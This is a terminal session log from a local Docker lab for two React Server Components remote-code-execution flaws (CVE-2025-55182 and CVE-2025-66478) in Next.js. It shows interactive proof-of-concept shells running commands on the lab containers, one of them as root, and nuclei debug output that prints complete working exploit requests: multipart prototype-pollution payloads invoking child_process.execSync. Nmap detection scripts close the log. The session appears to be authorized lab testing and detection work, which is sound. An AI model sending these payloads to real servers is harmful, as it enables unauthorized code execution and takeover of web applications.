 => => naming to docker.io/library/next_rsc_two_cves_lab-nextjs-66478                                            0.0s 
 => [nextjs-66478] resolving provenance for metadata file                                                        0.0s 
[+] Running 4/4
 ✔ nextjs-66478                           Built                                                                  0.0s 
 ✔ Network next_rsc_two_cves_lab_default  Created                                                                0.0s 
 ✔ Container react2shell-cve-2025-55182   Started                                                                0.4s 
 ✔ Container nextjs-cve-2025-66478        Started                                                                0.4s 
[*] 构建 Next.js 扫描器...

======================================================================

部署完成。

React2Shell（CVE-2025-55182）：
  本机访问:   curl http://127.0.0.1:3000
  远程访问:   http://10.211.55.65:3000

Next.js 16.0.6（CVE-2025-66478）：
  本机访问:   curl http://127.0.0.1:3001
  远程访问:   http://10.211.55.65:3001

当前容器状态：
----------------------------------------------------------------------
nextjs-cve-2025-66478        Up 7 seconds   0.0.0.0:3001->3000/tcp, :::3001->3000/tcp
react2shell-cve-2025-55182   Up 7 seconds   0.0.0.0:3000->3000/tcp, :::3000->3000/tcp
----------------------------------------------------------------------

停止环境：
  docker compose down

======================================================================
仅限本地 / 授权环境测试使用。
======================================================================

hx@orz:~/1207/next_rsc_two_cves_lab$ ./nextjs-rce-scanner -file urls.txt -c 1
[*] Starting scan of 1 targets, concurrency: 1
--------------------------------------------------------------------------------
[launcher.Browser]2025/12/07 06:28:57 Download: https://registry.npmmirror.com/-/binary/chromium-browser-snapshots/Linux_x64/1321438/chrome-linux.zip
[launcher.Browser]2025/12/07 06:28:57 Progress: 00%
[launcher.Browser]2025/12/07 06:28:58 Progress: 01%
[launcher.Browser]2025/12/07 06:28:59 Progress: 03%
[launcher.Browser]2025/12/07 06:29:00 Progress: 05%
[launcher.Browser]2025/12/07 06:29:01 Progress: 08%
[launcher.Browser]2025/12/07 06:29:02 Progress: 10%
[launcher.Browser]2025/12/07 06:29:03 Progress: 12%
[launcher.Browser]2025/12/07 06:29:04 Progress: 14%
[launcher.Browser]2025/12/07 06:29:05 Progress: 16%
[launcher.Browser]2025/12/07 06:29:06 Progress: 18%
[launcher.Browser]2025/12/07 06:29:07 Progress: 21%
[launcher.Browser]2025/12/07 06:29:08 Progress: 23%
[launcher.Browser]2025/12/07 06:29:09 Progress: 25%
[launcher.Browser]2025/12/07 06:29:10 Progress: 28%
[launcher.Browser]2025/12/07 06:29:11 Progress: 30%
[launcher.Browser]2025/12/07 06:29:12 Progress: 33%
[launcher.Browser]2025/12/07 06:29:13 Progress: 35%
[launcher.Browser]2025/12/07 06:29:15 Progress: 38%
[launcher.Browser]2025/12/07 06:29:16 Progress: 40%
[launcher.Browser]2025/12/07 06:29:17 Progress: 43%
[launcher.Browser]2025/12/07 06:29:18 Progress: 45%
[launcher.Browser]2025/12/07 06:29:19 Progress: 47%
[launcher.Browser]2025/12/07 06:29:20 Progress: 50%
[launcher.Browser]2025/12/07 06:29:21 Progress: 51%
[launcher.Browser]2025/12/07 06:29:22 Progress: 53%
[launcher.Browser]2025/12/07 06:29:23 Progress: 55%
[launcher.Browser]2025/12/07 06:29:24 Progress: 57%
[launcher.Browser]2025/12/07 06:29:25 Progress: 59%
[launcher.Browser]2025/12/07 06:29:26 Progress: 62%
[launcher.Browser]2025/12/07 06:29:27 Progress: 64%
[launcher.Browser]2025/12/07 06:29:28 Progress: 66%
[launcher.Browser]2025/12/07 06:29:29 Progress: 69%
[launcher.Browser]2025/12/07 06:29:30 Progress: 71%
[launcher.Browser]2025/12/07 06:29:31 Progress: 73%
[launcher.Browser]2025/12/07 06:29:32 Progress: 76%
[launcher.Browser]2025/12/07 06:29:33 Progress: 78%
[launcher.Browser]2025/12/07 06:29:34 Progress: 81%
[launcher.Browser]2025/12/07 06:29:35 Progress: 83%
[launcher.Browser]2025/12/07 06:29:36 Progress: 85%
[launcher.Browser]2025/12/07 06:29:37 Progress: 88%
[launcher.Browser]2025/12/07 06:29:38 Progress: 90%
[launcher.Browser]2025/12/07 06:29:39 Progress: 93%
[launcher.Browser]2025/12/07 06:29:40 Progress: 94%
[launcher.Browser]2025/12/07 06:29:41 Progress: 97%
[launcher.Browser]2025/12/07 06:29:42 Progress: 99%
[launcher.Browser]2025/12/07 06:29:42 Unzip: /home/hx/.cache/rod/browser/chromium-1321438
[launcher.Browser]2025/12/07 06:29:42 Progress: 00%
[launcher.Browser]2025/12/07 06:29:43 Progress: 25%
[launcher.Browser]2025/12/07 06:29:44 Progress: 45%
[launcher.Browser]2025/12/07 06:29:45 Progress: 85%
[launcher.Browser]2025/12/07 06:29:45 Downloaded: /home/hx/.cache/rod/browser/chromium-1321438
URL                                           Status       Next.js Version    Vulnerability  
-----------------------------------------------------------------------------------------------
http://127.0.0.1:3001                         200          16.0.6             Vulnerable ⚠️

(venv) hx@orz:~/1207/next_rsc_two_cves_lab/CVE-2025-55182-msanft$ python poc_shell.py

$$\                                               
$$ |                                              
$$$$$$$\  $$\   $$\  $$$$$$\   $$$$$$\  $$$$$$$$\ 
$$  __$$\ \$$\ $$  |$$  __$$\ $$  __$$\ \____$$  |
$$ |  $$ | \$$$$  / $$ /  $$ |$$ |  \__|  $$$$ _/ 
$$ |  $$ | $$  $$<  $$ |  $$ |$$ |       $$  _/   
$$ |  $$ |$$  /\$$\ \$$$$$$  |$$ |      $$$$$$$$\ 
\__|  \__|\__/  \__| \______/ \__|      \________|
                                                  
                                                  
                                                  

        hxorz :: RSC Interactive RCE Shell
        CVE-2025-55182 / CVE-2025-66478

仅限你自己的靶机 / 授权测试环境使用

请输入目标 IP 或 IP:端口（例如 10.211.55.65 或 10.211.55.65:3000）: 10.211.55.65
[*] 目标地址已设为: http://10.211.55.65:3000

rsc-shell> id
[+] HTTP 500
>>> 命令输出：
uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)
rsc-shell> ls
[+] HTTP 500
>>> 命令输出：
node_modules
package.json
public
rsc-shell> whoami
[+] HTTP 500
>>> 命令输出：
nextjs
rsc-shell> uname -a
[+] HTTP 500
>>> 命令输出：
Linux 883d7b9c2784 5.4.0-216-generic #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025 x86_64 Linux
rsc-shell>

(venv) hx@orz:~/1207/next_rsc_two_cves_lab/Next.js-RSC-RCE-Scanner-CVE-2025-66478$ python3 nextjs_66478_shell.py

$$\                                               
$$ |                                              
$$$$$$$\  $$\   $$\  $$$$$$\   $$$$$$\  $$$$$$$$\ 
$$  __$$\ \$$\ $$  |$$  __$$\ $$  __$$\ \____$$  |
$$ |  $$ | \$$$$  / $$ /  $$ |$$ |  \__|  $$$$ _/ 
$$ |  $$ | $$  $$<  $$ |  $$ |$$ |       $$  _/   
$$ |  $$ |$$  /\$$\ \$$$$$$  |$$ |      $$$$$$$$\ 
\__|  \__|\__/  \__| \______/ \__|      \________|

        hxorz :: Next.js RSC Interactive RCE Shell
        CVE-2025-66478 (authorized lab only)

提示：仅限你自己的靶机 / 授权实验环境使用。

请输入 Next.js 目标 IP 或 IP:端口（默认 127.0.0.1:3001）: 10.211.55.65
[*] 目标地址已设为: http://10.211.55.65:3001

nextjs-rsc> ls
[+] HTTP 500
>>> 命令输出：
Dockerfile
README.md
eslint.config.mjs
next-env.d.ts
next.config.ts
node_modules
package-lock.json
package.json
postcss.config.mjs
public
src
tsconfig.json
nextjs-rsc> whoami
[+] HTTP 500
>>> 命令输出：
root
nextjs-rsc> id
[+] HTTP 500
>>> 命令输出：
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
nextjs-rsc>

(venv) hx@orz:~/1207$ vim install_nuclei.sh
(venv) hx@orz:~/1207$ chmod +x install_nuclei.sh 
(venv) hx@orz:~/1207$ ./install_nuclei.sh 
============================================
[*] Official Nuclei Installer (Proxy Ready)
============================================
[*] Version: v3.6.0
[*] Download URL:
    https://github.com/projectdiscovery/nuclei/releases/download/v3.6.0/nuclei_3.6.0_linux_amd64.zip
[*] Working directory: /tmp/nuclei-install

[*] Downloading nuclei from official GitHub...
--2025-12-07 07:41:46--  https://github.com/projectdiscovery/nuclei/releases/download/v3.6.0/nuclei_3.6.0_linux_amd64.zip
Connecting to 10.80.36.177:7890... connected.
Proxy request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/252813491/08235f23-dcba-4308-8c62-cd72a5e8bf71?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-12-07T08%3A24%3A24Z&rscd=attachment%3B+filename%3Dnuclei_3.6.0_linux_amd64.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-12-07T07%3A23%3A55Z&ske=2025-12-07T08%3A24%3A24Z&sks=b&skv=2018-11-09&sig=wRhwh4ydxhnTlYYG6bmJ0nBReVSBfLpZMz%2BuLH30aGc%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2NTA5NTEwNiwibmJmIjoxNzY1MDkzMzA2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.dcTucP-rrf_iea3yXl11SC6p5BRwe6UFIVKfAjea1Z0&response-content-disposition=attachment%3B%20filename%3Dnuclei_3.6.0_linux_amd64.zip&response-content-type=application%2Foctet-stream [following]
--2025-12-07 07:41:47--  https://release-assets.githubusercontent.com/github-production-release-asset/252813491/08235f23-dcba-4308-8c62-cd72a5e8bf71?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-12-07T08%3A24%3A24Z&rscd=attachment%3B+filename%3Dnuclei_3.6.0_linux_amd64.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-12-07T07%3A23%3A55Z&ske=2025-12-07T08%3A24%3A24Z&sks=b&skv=2018-11-09&sig=wRhwh4ydxhnTlYYG6bmJ0nBReVSBfLpZMz%2BuLH30aGc%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2NTA5NTEwNiwibmJmIjoxNzY1MDkzMzA2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.dcTucP-rrf_iea3yXl11SC6p5BRwe6UFIVKfAjea1Z0&response-content-disposition=attachment%3B%20filename%3Dnuclei_3.6.0_linux_amd64.zip&response-content-type=application%2Foctet-stream
Connecting to 10.80.36.177:7890... connected.
Proxy request sent, awaiting response... 200 OK
Length: 40394771 (39M) [application/octet-stream]
Saving to: ‘nuclei_3.6.0_linux_amd64.zip’

nuclei_3.6.0_linux_amd64.zip  100%[===============================================>]  38.52M  4.77MB/s    in 8.9s    

2025-12-07 07:41:57 (4.35 MB/s) - ‘nuclei_3.6.0_linux_amd64.zip’ saved [40394771/40394771]

[+] Download success!
[*] Installing unzip...
Hit:1 https://mirrors.ustc.edu.cn/ubuntu focal InRelease
Hit:2 https://mirrors.ustc.edu.cn/ubuntu focal-updates InRelease                                                     
Hit:3 https://mirrors.ustc.edu.cn/ubuntu focal-backports InRelease                                                   
Hit:4 https://mirrors.ustc.edu.cn/ubuntu focal-security InRelease                                                    
Hit:5 https://download.docker.com/linux/ubuntu focal InRelease                                                       
Hit:6 https://dl.google.com/linux/chrome/deb stable InRelease                                                        
Hit:7 https://aquasecurity.github.io/trivy-repo/deb focal InRelease
Reading package lists... Done
Building dependency tree       
Reading state information... Done
77 packages can be upgraded. Run 'apt list --upgradable' to see them.
Reading package lists... Done
Building dependency tree       
Reading state information... Done
unzip is already the newest version (6.0-25ubuntu1.2).
The following packages were automatically installed and are no longer required:
  python3-cached-property python3-docker python3-dockerpty python3-docopt python3-texttable python3-websocket
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 77 not upgraded.
[*] Unzipping nuclei...
Archive:  nuclei_3.6.0_linux_amd64.zip
  inflating: LICENSE.md              
  inflating: README.md               
  inflating: README_CN.md            
  inflating: README_ES.md            
  inflating: README_ID.md            
  inflating: README_JP.md            
  inflating: README_KR.md            
  inflating: README_PT-BR.md         
  inflating: nuclei                  
[*] Installing nuclei to /usr/local/bin/nuclei ...
[*] Verifying installation...
[INF] Nuclei Engine Version: v3.6.0
[INF] Nuclei Config Directory: /home/hx/.config/nuclei
[INF] Nuclei Cache Directory: /home/hx/.cache/nuclei
[INF] PDCP Directory: /home/hx/.pdcp

[+] nuclei installation completed successfully!
[+] Binary path: /usr/local/bin/nuclei
[+] Version info:
[INF] Nuclei Engine Version: v3.6.0
[INF] Nuclei Config Directory: /home/hx/.config/nuclei
[INF] Nuclei Cache Directory: /home/hx/.cache/nuclei
[INF] PDCP Directory: /home/hx/.pdcp
============================================

(venv) hx@orz:~/1207$ nuclei -u http://127.0.0.1:3001 \
>   -t /home/hx/nuclei-templates/custom/nextjs-cve-2025-66478-rce-3001.yaml \
>   -severity high -debug

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.6.0

		projectdiscovery.io

[INF] Current nuclei version: v3.6.0 (latest)
[INF] Current nuclei-templates version: v10.3.5 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 57
[INF] Templates loaded for current scan: 1
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] [nextjs-cve-2025-66478-rce-3001] Dumped HTTP request for http://127.0.0.1:3001

POST / HTTP/1.1
Host: 127.0.0.1:3001
User-Agent: nuclei-rsc-rce-check
Content-Length: 654
Accept: */*
Accept-Language: en
Connection: close
Content-Type: multipart/form-data; boundary=----hxorzboundary
Next-Action: x
X-Nextjs-Html-Request-Id: hxorz
X-Nextjs-Request-Id: hxorz
Accept-Encoding: gzip

------hxorzboundary
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{timeout:5000}).toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------hxorzboundary
Content-Disposition: form-data; name="1"

"$@0"
------hxorzboundary
Content-Disposition: form-data; name="2"

[]
------hxorzboundary--
[DBG] [nextjs-cve-2025-66478-rce-3001] Dumped HTTP response http://127.0.0.1:3001

HTTP/1.1 500 Internal Server Error
Connection: close
Transfer-Encoding: chunked
Cache-Control: no-store, must-revalidate
Content-Type: text/x-component
Date: Sun, 07 Dec 2025 08:24:24 GMT
Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding

:N1765095864062.5676
0:{"a":"$@1","f":"","b":"development"}
1:D{"time":0.6225900000426918}
1:E{"digest":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server","owner":null}
[nextjs-cve-2025-66478-rce-3001:regex-1] [http] [high] http://127.0.0.1:3001 ["uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)"]
[INF] Scan completed in 317.354604ms. 1 matches found.

(venv) hx@orz:~/1207$ vim /home/hx/nuclei-templates/custom/react2shell-cve-2025-55182-rce-body-id.yaml
(venv) hx@orz:~/1207$ nuclei -u http://127.0.0.1:3000 \
>   -t /home/hx/nuclei-templates/custom/react2shell-cve-2025-55182-rce-body-id.yaml \
>   -severity high -debug

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.6.0

		projectdiscovery.io

[INF] Current nuclei version: v3.6.0 (latest)
[INF] Current nuclei-templates version: v10.3.5 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 57
[INF] Templates loaded for current scan: 1
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] [react2shell-cve-2025-55182-rce-body-id] Dumped HTTP request for http://127.0.0.1:3000/

POST / HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close
Content-Length: 742
Accept: */*
Accept-Encoding: gzip
Accept-Language: en
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Next-Action: x
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
X-Nextjs-Request-Id: b5dce965

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
[DBG] [react2shell-cve-2025-55182-rce-body-id] Dumped HTTP response http://127.0.0.1:3000/

HTTP/1.1 500 Internal Server Error
Connection: close
Transfer-Encoding: chunked
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Content-Encoding: gzip
Content-Type: text/x-component
Date: Sun, 07 Dec 2025 08:34:43 GMT
Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding
X-Nextjs-Cache: HIT
X-Nextjs-Prerender: 1

0:{"a":"$@1","f":"","b":"5941Ebq06FSt7qrd9rfm6"}
1:E{"digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)"}
[react2shell-cve-2025-55182-rce-body-id:status-1] [http] [high] http://127.0.0.1:3000/ [""digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)""]
[react2shell-cve-2025-55182-rce-body-id:word-2] [http] [high] http://127.0.0.1:3000/ [""digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)""]
[react2shell-cve-2025-55182-rce-body-id:regex-3] [http] [high] http://127.0.0.1:3000/ [""digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)""]
[INF] Scan completed in 80.407203ms. 3 matches found.

(venv) hx@orz:~/1207$ vim /home/hx/nuclei-templates/custom/react2shell-cve-2025-55182-rce-safe-check.yaml
(venv) hx@orz:~/1207$ nuclei -u http://127.0.0.1:3000   -t /home/hx/nuclei-templates/custom/react2shell-cve-2025-55182-rce-safe-check.yaml   -severity high -debug

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.6.0

		projectdiscovery.io

[INF] Current nuclei version: v3.6.0 (latest)
[INF] Current nuclei-templates version: v10.3.5 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 57
[INF] Templates loaded for current scan: 1
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] [react2shell-cve-2025-55182-rce-safe-check] Dumped HTTP request for http://127.0.0.1:3000/

POST / HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 735
Accept: */*
Accept-Language: en
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Next-Action: x
Accept-Encoding: gzip

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var out=process.mainModule.require('child_process').execSync('id',{'timeout':3000}).toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:out});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
[DBG] [react2shell-cve-2025-55182-rce-safe-check] Dumped HTTP response http://127.0.0.1:3000/

HTTP/1.1 500 Internal Server Error
Connection: close
Transfer-Encoding: chunked
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Content-Type: text/x-component
Date: Sun, 07 Dec 2025 08:36:49 GMT
Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding
X-Nextjs-Cache: HIT
X-Nextjs-Prerender: 1

0:{"a":"$@1","f":"","b":"5941Ebq06FSt7qrd9rfm6"}
1:E{"digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)"}
[react2shell-cve-2025-55182-rce-safe-check:status-1] [http] [high] http://127.0.0.1:3000/ ["uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)"]
[react2shell-cve-2025-55182-rce-safe-check:word-2] [http] [high] http://127.0.0.1:3000/ ["uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)"]
[react2shell-cve-2025-55182-rce-safe-check:regex-3] [http] [high] http://127.0.0.1:3000/ ["uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)"]
[INF] Scan completed in 14.37345ms. 3 matches found.

(venv) hx@orz:~/1207$ nuclei \
>   -u http://10.211.55.65:3001 \
>   -u http://10.211.55.65:3000 \
>   -t ~/nuclei-templates/custom/nextjs-cve-2025-66478-rce-3001.yaml \
>   -t ~/nuclei-templates/custom/react2shell-cve-2025-55182-rce-body-id.yaml \
>   -severity high

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.6.0

		projectdiscovery.io

[INF] Current nuclei version: v3.6.0 (latest)
[INF] Current nuclei-templates version: v10.3.5 (latest)
[INF] New templates added in latest release: 57
[INF] Templates loaded for current scan: 2
[WRN] Loading 2 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 2
[react2shell-cve-2025-55182-rce-body-id:rce-id-output] [http] [high] http://10.211.55.65:3000/ [""digest":"uid=1001(nextjs) gid=1001(nodejs) groups=1001(nodejs)""]
[react2shell-cve-2025-55182-rce-body-id:rce-id-output] [http] [high] http://10.211.55.65:3001/ [""digest":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)""]
[nextjs-cve-2025-66478-rce-3001] [http] [high] http://10.211.55.65:3001 ["uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)"]
[INF] Scan completed in 582.257106ms. 3 matches found.
(venv) hx@orz:~/1207$

(venv) hx@orz:~/1207/next_rsc_two_cves_lab$ ls
CVE-2025-55182-msanft                   docker-compose.yml  nextjs-rsc-cve-2025-66478-detect.nse
Next.js-RSC-RCE-Scanner-CVE-2025-66478  nextjs-66478        react2shell-cve-2025-55182-detect.nse
React2Shell-src                         nextjs-rce-scanner  urls.txt
(venv) hx@orz:~/1207/next_rsc_two_cves_lab$ nmap -p 3000,3001 --script react2shell-cve-2025-55182-detect.nse,nextjs-rsc-cve-2025-66478-detect.nse 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-07 09:16 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000069s latency).

PORT     STATE SERVICE
3000/tcp open  ppp
| react2shell-cve-2025-55182-detect: VULNERABLE: React2Shell-style RSC digest behavior detected (CVE-2025-55182).
| HTTP status: 500
| Content-Type: text/x-component
| Observed digest: 1917316682
| NOTE: This confirms RSC digest exposure. In a real environment,
|_      exploitability should be further validated with controlled PoCs.
3001/tcp open  nessus
| nextjs-rsc-cve-2025-66478-detect: VULNERABLE: Next.js RSC digest behavior detected (CVE-2025-66478-style).
| HTTP status: 500
| Content-Type: text/x-component
| Observed digest: 3420135227
| NOTE: This confirms RSC digest exposure. In real deployments,
|_      further PoC validation may convert this into code execution.

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
(venv) hx@orz:~/1207/next_rsc_two_cves_lab$  
```
